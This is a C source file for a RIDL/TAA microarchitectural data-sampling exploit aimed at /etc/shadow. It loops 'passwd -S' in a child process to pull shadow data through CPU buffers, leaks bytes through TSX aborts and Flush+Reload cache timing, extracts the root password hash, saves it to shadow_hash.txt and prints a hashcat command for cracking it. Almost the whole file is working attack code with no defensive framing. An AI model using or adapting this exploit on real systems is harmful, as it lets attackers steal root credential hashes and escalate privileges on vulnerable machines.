#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <immintrin.h>
#include "asm.h"

#define CACHE_THRESHOLD 80
#define POSSIBLE_BYTES 256
#define STRIDE 4096
#define MAX_LEAK_BYTES 200
#define MIN_CONFIDENCE 5

// Global memory buffers
unsigned char __attribute__((aligned(4096))) reloadbuffer[POSSIBLE_BYTES * STRIDE];
unsigned char __attribute__((aligned(4096))) leak[4096];
char leaked_shadow[MAX_LEAK_BYTES];
int hit_counts[POSSIBLE_BYTES];
pid_t trigger_pid = 0;

// Start continuous shadow file access trigger
void start_shadow_trigger() {
    trigger_pid = fork();
    if (trigger_pid == 0) {
        // Child process - continuously read shadow via passwd
        printf("[Trigger] Starting passwd loop on core...\n");
        while(1) {
            (void)system("passwd -S $(whoami) > /dev/null 2>&1");
            usleep(5000); // 5ms between attempts
        }
        exit(0);
    }
    printf("[Trigger] Started trigger process (PID: %d)\n", trigger_pid);
    usleep(100000); // 100ms to let trigger start
}

// Stop the trigger process
void stop_shadow_trigger() {
    if (trigger_pid > 0) {
        kill(trigger_pid, SIGTERM);
        waitpid(trigger_pid, NULL, 0);
        printf("[Trigger] Stopped trigger process\n");
    }
}

// RIDL attack using TAA - same technique as CrossTalk
unsigned char ridl_leak_byte(int position) {
    memset(hit_counts, 0, sizeof(hit_counts));
    
    for (int attempt = 0; attempt < 1000; attempt++) {
        // 1. Flush reload buffer
        for (int i = 0; i < POSSIBLE_BYTES; i++) {
            clflush(&reloadbuffer[i * STRIDE]);
        }
        sfence();
        
        // 2. TAA attack (same as CrossTalk)
        clflush(leak + (position % 4096));
        sfence();
        
        if (_xbegin() == _XBEGIN_STARTED) {
            // Speculatively load from CPU buffers (LFB)
            size_t index = *(leak + (position % 4096)) * STRIDE;
            *(volatile char*)(reloadbuffer + index);
            _xend();
        }
        
        // 3. Check what was leaked via cache timing
        for (int byte_val = 32; byte_val < 127; byte_val++) { // Printable ASCII
            uint64_t time = get_reload_time(&reloadbuffer[byte_val * STRIDE]);
            if (time < CACHE_THRESHOLD) {
                hit_counts[byte_val]++;
            }
        }
    }
    
    // 4. Find most confident byte
    int max_hits = 0;
    unsigned char best_byte = 0;
    
    for (int byte_val = 32; byte_val < 127; byte_val++) {
        if (hit_counts[byte_val] > max_hits) {
            max_hits = hit_counts[byte_val];
            best_byte = byte_val;
        }
    }
    
    if (max_hits >= MIN_CONFIDENCE) {
        printf("Position %3d: '%c' (0x%02x) hits=%d\n", position, best_byte, best_byte, max_hits);
        return best_byte;
    } else {
        return 0; // No confident result
    }
}

// Look for shadow file patterns in leaked data
char* extract_shadow_hash() {
    static char hash[65]; // MD5/SHA hash max length
    
    // Look for "root:$" pattern
    char* root_start = strstr(leaked_shadow, "root:$");
    if (!root_start) {
        printf("[Hash] No 'root:$' pattern found\n");
        return NULL;
    }
    
    printf("[Hash] Found root entry: %.50s...\n", root_start);
    
    // Find hash type ($1$, $5$, $6$, etc.)
    char* hash_start = strchr(root_start + 5, '$');
    if (!hash_start) return NULL;
    
    // Skip salt to find actual hash
    hash_start = strchr(hash_start + 1, '$');
    if (!hash_start) return NULL;
    
    hash_start++; // Move past the $
    
    // Find end of hash (: or next field)
    char* hash_end = strchr(hash_start, ':');
    if (!hash_end) return NULL;
    
    int hash_len = hash_end - hash_start;
    if (hash_len <= 0 || hash_len > 64) return NULL;
    
    strncpy(hash, hash_start, hash_len);
    hash[hash_len] = '\0';
    
    return hash;
}

int main() {
    printf("=== RIDL Attack on /etc/shadow ===\n");
    printf("Using TAA technique (same as CrossTalk)\n\n");
    
    // Initialize memory
    memset(reloadbuffer, 1, sizeof(reloadbuffer));
    memset(leak, 1, sizeof(leak));
    memset(leaked_shadow, 0, sizeof(leaked_shadow));
    
    // Start shadow file trigger
    start_shadow_trigger();
    
    printf("[RIDL] Starting attack loop...\n");
    
    int leaked_bytes = 0;
    int consecutive_failures = 0;
    
    // Main RIDL attack loop
    for (int pos = 0; pos < MAX_LEAK_BYTES && consecutive_failures < 20; pos++) {
        unsigned char leaked_byte = ridl_leak_byte(pos);
        
        if (leaked_byte != 0) {
            leaked_shadow[leaked_bytes] = leaked_byte;
            leaked_bytes++;
            consecutive_failures = 0;
            
            // Null terminate for string operations
            leaked_shadow[leaked_bytes] = '\0';
            
            // Check if we found interesting patterns
            if (strstr(leaked_shadow, "root:$")) {
                printf("[RIDL] Found shadow pattern! Continuing to extract hash...\n");
            }
            
            // Print progress every 20 bytes
            if (leaked_bytes % 20 == 0) {
                printf("[Progress] %d bytes: %s\n", leaked_bytes, leaked_shadow);
            }
            
        } else {
            consecutive_failures++;
            printf("Position %3d: no confident result (failures: %d)\n", pos, consecutive_failures);
        }
    }
    
    // Stop trigger
    stop_shadow_trigger();
    
    printf("\n=== RIDL Attack Results ===\n");
    printf("Total leaked bytes: %d\n", leaked_bytes);
    printf("Leaked data: %s\n", leaked_shadow);
    
    // Try to extract hash
    char* hash = extract_shadow_hash();
    if (hash && strlen(hash) > 10) {
        printf("\n=== SUCCESS: Extracted Hash ===\n");
        printf("Hash: %s\n", hash);
        printf("Length: %zu characters\n", strlen(hash));
        
        // Save hash for hashcat
        FILE* hash_file = fopen("shadow_hash.txt", "w");
        if (hash_file) {
            fprintf(hash_file, "%s\n", hash);
            fclose(hash_file);
            printf("Hash saved to: shadow_hash.txt\n");
            printf("\nTo crack with hashcat:\n");
            printf("hashcat -m 1800 shadow_hash.txt -a 3 'prefix?1?1?1?1' -1 ?l?d\n");
        }
        
        return 0;
    } else {
        printf("\n=== No valid hash extracted ===\n");
        printf("Try running again or check system activity\n");
        return 1;
    }
}